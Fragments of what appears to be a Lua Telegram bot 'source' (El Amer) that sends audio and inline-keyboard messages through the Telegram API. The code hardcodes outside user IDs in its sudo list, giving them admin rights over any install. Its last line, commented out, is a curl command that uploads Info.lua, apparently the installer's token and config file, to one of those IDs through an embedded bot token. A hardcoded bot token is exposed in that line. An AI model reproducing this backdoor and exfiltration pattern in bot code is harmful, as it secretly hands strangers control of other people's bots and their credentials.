...
sudo_users = {SUDO,1236115319,1124610301,1458090052}   
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼 𝑬𝒍 𝑨𝒎𝒆𝒓 ⁦⁦")  
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝒕𝒘𝒂𝒔𝒐𝒍', url="t.me/Legannd_bot"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝒘𝒆𝒍𝒄𝒐𝒎𝒆 𝒕𝒐 𝑬𝒍 𝑨𝒎𝒆𝒓 ⁦⁦',url="t.me/UU_bh1"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
{
{text = '𝚂𝙾𝚄𝚁𝙲𝙴 𝙴𝙻𝙼𝚄𝚂𝙻𝙸𝙼', url="t.me/E_L_A_M_E_R"},
...
--local curl = 'curl "'..'https://api.telegram.org/bot1824829053:AAEBrMn4SqFsZ-Qe1TtPILyeTc34NSyCyMM/sendDocument'..'" -F "chat_id='.. 1124610301 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
------------------------------------------------------------------------
